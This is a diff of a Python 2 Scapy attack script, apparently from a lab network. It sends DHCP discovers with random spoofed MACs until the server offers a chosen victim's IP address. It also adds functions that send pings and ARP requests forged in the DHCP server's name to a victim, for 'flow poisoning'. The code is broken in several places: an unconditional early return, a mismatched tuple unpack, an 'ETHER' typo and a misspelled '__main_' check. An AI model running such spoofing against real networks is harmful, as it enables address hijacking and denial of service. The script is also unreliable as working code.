@@ -1,18 +1,43 @@
 from scapy.all import *
 import random
+from time import sleep
+
 localiface = 'h1-eth0'
 broadcastMac = 'ff:ff:ff:ff:ff:ff'
 broadcastIp = '255.255.255.255'
 
+
+def sendPingToVic(servMac, vicMac, vicIp, servIp):
+    #For flow poisoning, ping the other server?
+
+    pingEth = Ether(src = servMac, dst = vicMac)
+    pingIp = IP(src = servIp, dst = vicIp)
+    pingICMP = ICMP()
+
+    fullPing = pingEth/pingIp/pingICMP
+
+    sleep(12)
+
+    pingRecv = srp1(fullPing, iface=localiface)
+    print pingRecv
+
+def sendArpToVic(servMac, vicMac, vicIp, servIp):
+    arpEth = Ether(src = servMac, dst = broadcastMac)
+    arp = ARP(op = 1, pdst = vicIp, psrc = servIp)
+    fullArp = arpEth/arp
+    arpRecv = srp1(fullArp, iface=localiface)
+
 #Need to use local MAC so can get response? 
-def getDHCP(localMac, ipToTake):
+def getDHCP(localMac, ipToTake, vicMac):
 
     newIp = ''
     count = 0
     fakeMac = ''
     fakeRaw = ''
     curXid = 0
-
+    servIp = ''
+    servMac = ''
+    
     while newIp != ipToTake:
         count += 1
         fakeMac = ''
@@ -32,37 +57,67 @@ def getDHCP(localMac, ipToTake):
         bootPk = BOOTP(chaddr = fakeRaw, xid = curXid)
         dhcpPk = DHCP(options=[('message-type', 'discover'), 'end'])
         discovery = ethPk/ipPk/udpPk/bootPk/dhcpPk
-    
+
+        #Quick heuristic: assume first one wont be correct, so easy way to
+        #get info
+        #Current Trouble: Seem that l2_learning_switch is a per flow basis,
+        #so may need to actually send ARPs instead of pings?
+        return (0,0,0,0,0,0)
+        sendPingToVic(servMac, vicMac, ipToTake, servIp)
+        sendArpToVic(servMac, vicMac, ipToTake, servIp)
+
         recvPk = srp1(discovery,iface=localiface)
+
         newIp = recvPk[BOOTP].yiaddr
         print newIp
         print fakeMac
+
+        if servIp == '':
+            servMac = recvPk[Ether].src
+            for i in range(len(recvPk[DHCP].options)):
+                if recvPk[DHCP].options[i][0] == "server_id":
+                    servIp = recvPk[DHCP].options[i][1]
+    
+        
+        #if count > 10:
+ #       break
     print "Offered IP is: " 
     print recvPk[BOOTP].yiaddr
     print fakeMac
         
     servIp = recvPk[BOOTP].siaddr
-    return (fakeMac, servIp, fakeRaw, curXid, newIp)
+    servMac = recvPk[ETHER].src
+    for i in range(len(recvPk[DHCP].options)):
+        if recvPk[DHCP].options[i][0] == "server_id":
+            servIp = recvPk[DHCP].options[i][1]
+    
+    return (fakeMac, servIp, fakeRaw, curXid, newIp, servMac)
 
-conf.checkIPaddr = False
-localMac = sys.argv[1]
-ipToTake = sys.argv[2]
-fakeMac, servIp, fakeRaw, curXid, newIp = getDHCP(localMac, ipToTake)
-print newIp
-print fakeMac
-            
+def main():
+    conf.checkIPaddr = False
+    localMac = sys.argv[1]
+    ipToTake = sys.argv[2]
+    vicMac = sys.argv[3]
+    fakeMac, servIp, fakeRaw, curXid, newIp = getDHCP(localMac, ipToTake, vicMac)
+    print newIp
+    print fakeMac
+    
 
-#Request for the DHCP addr
-ethPk = Ether(src=fakeMac, dst = 'ff:ff:ff:ff:ff:ff')
-ipPk = IP(src = "0.0.0.0", dst = "255.255.255.255")
-udpPk = UDP(dport=67, sport=68)
-bootPk = BOOTP(chaddr = fakeRaw, xid=curXid)
-requestPk = DHCP(options=[("message-type", "request"),
-                          ("server_id",servIp), ("requested_addr", newIp), "end"])
+#Request for the DHCP addr; currently blocking when testing with udhcpd
+#ethPk = Ether(src=fakeMac, dst = 'ff:ff:ff:ff:ff:ff')
+#ppipPk = IP(src = "0.0.0.0", dst = "255.255.255.255")
+#udpPk = UDP(dport=67, sport=68)
+#bootPk = BOOTP(chaddr = fakeRaw, xid=curXid)
+#requestPk = DHCP(options=[("message-type", "request"),
+#                        ("server_id",servIp), ("requested_addr", newIp), "end"])
+#
+#fullReq = ethPk/ipPk/udpPk/bootPk/requestPk
 
-fullReq = ethPk/ipPk/udpPk/bootPk/requestPk
+#recvPk = srp1(fullReq, iface=localiface)
 
-recvPk = srp1(fullReq, iface=localiface)
+#print newIp
+#print fakeMac
 
-print newIp
-print fakeMac
+
+if __name__ == "__main_":
+    main()
